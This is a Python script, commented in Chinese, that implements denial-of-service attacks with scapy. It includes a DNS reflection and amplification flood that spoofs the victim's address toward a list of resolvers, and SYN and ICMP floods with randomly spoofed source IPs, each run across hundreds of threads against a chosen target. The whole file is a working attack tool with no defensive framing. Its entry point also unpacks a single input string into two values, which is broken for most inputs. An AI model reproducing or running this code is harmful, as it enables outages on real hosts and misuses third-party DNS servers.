import random
import string
import threading

from scapy.layers.dns import DNS, DNSQR
from scapy.layers.inet import IP, TCP, ICMP, UDP
from scapy.sendrecv import sr1, send

from menu import menu

# 生成负载
payload = ''
for i in range(20):
    srt = ''.join(random.sample(string.ascii_letters + string.digits, 50))
    payload = payload + srt

# 导入dns服务器地址以及查询域名，用于dns反射攻击
with open('dns.txt') as f:
    list_dns = f.readlines()
with open('domain.txt') as f:
    list_domain = f.readlines()


# 随机IP函数
def random_ip():
    i1 = 0
    # 排除局域网IP
    while i1 in (10, 192, 127, 172, 0):
        i1 = random.randint(1, 254)
    i2 = random.randint(1, 254)
    i3 = random.randint(1, 254)
    i4 = random.randint(1, 254)
    ip = f"{i1}.{i2}.{i3}.{i4}"
    return ip


# 随机端口函数
def random_port():
    # 范围10000-65535
    port = random.randint(10000, 65535)
    return port


# 启动多线程
def th(fun, args, dns=False):
    print('\033[34m正在启动线程：\033[0m')
    if not dns:
        for count in range(300):
            threading.Thread(name='FloodThread' + str(count), target=fun, args=args).start()
    else:
        for dns in list_dns:
            dns = dns.strip()
            threading.Thread(name='attack via ' + dns, target=fun, args=(args[0], args[1], dns)).start()


# dns反射放大攻击
def reflect_flood(d_ip, d_port, dns):
    print(f'\033[34m{threading.current_thread().getName()}\t\033[0m')
    for domain in list_domain:
        domain = domain.strip()
        for count in range(100):
            pkg = IP(src=d_ip, dst=dns) / UDP(dport=53, sport=d_port) / DNS(rd=1, qd=DNSQR(qname=domain))
            send(pkg, verbose=0)

    print(
        f"\033[92m线程{threading.current_thread().getName()}已结束,还有{len(threading.enumerate())}个线程在运行\n\033[0m")


# syn泛洪攻击
def syn_flood(d_ip, d_port, option):
    print(f'\033[34m{threading.current_thread().getName()}\t\033[0m')
    if option:
        for count in range(1000):
            s_ip = random_ip()
            s_port = random_port()
            # 指定目的端口端口泛洪，设置verbose=0不显示发送过程
            send(IP(dst=d_ip, src=s_ip) / TCP(sport=s_port, dport=d_port, flags='S') / payload, verbose=0)

        print(
            f"\033[92m线程{threading.current_thread().getName()}已结束,还有{len(threading.enumerate())}个线程在运行\n\033[0m")

    else:
        # 不使用随机源地址，则直接用预设的默认地址
        s_ip = '120.87.101.54'
        s_port = 12345
        for count in range(1000):
            send(IP(dst=d_ip, src=s_ip) / TCP(dport=d_port, sport=s_port, flags='S') / payload, verbose=0)

        print(
            f"\033[92m线程{threading.current_thread().getName()}已结束,还有{len(threading.enumerate())}个线程在运行\n\033[0m")


def icmp_flood(d_ip, option):
    print(f'\033[34m{threading.current_thread().getName()}\t\033[0m')
    if option:
        for count in range(1000):
            s_ip = random_ip()
            # 随机源地址ICMP泛洪
            send(IP(dst=d_ip, src=s_ip) / ICMP() / payload, verbose=0)

        print(
            f"\033[92m线程{threading.current_thread().getName()}已结束,还有{len(threading.enumerate())}个线程在运行\n\033[0m")

    else:
        # 不使用随机源地址，则直接用预设的默认地址
        s_ip = '120.87.101.54'
        for count in range(1000):
            send(IP(dst=d_ip, src=s_ip) / ICMP() / payload, verbose=0)

        print(
            f"\033[92m线程{threading.current_thread().getName()}已结束,还有{len(threading.enumerate())}个线程在运行\n\033[0m")


if __name__ == '__main__':
    ip, option = input('IP,option:')
    menu(ip, option)
    # for i in range(0,10):
    #     random_ip()
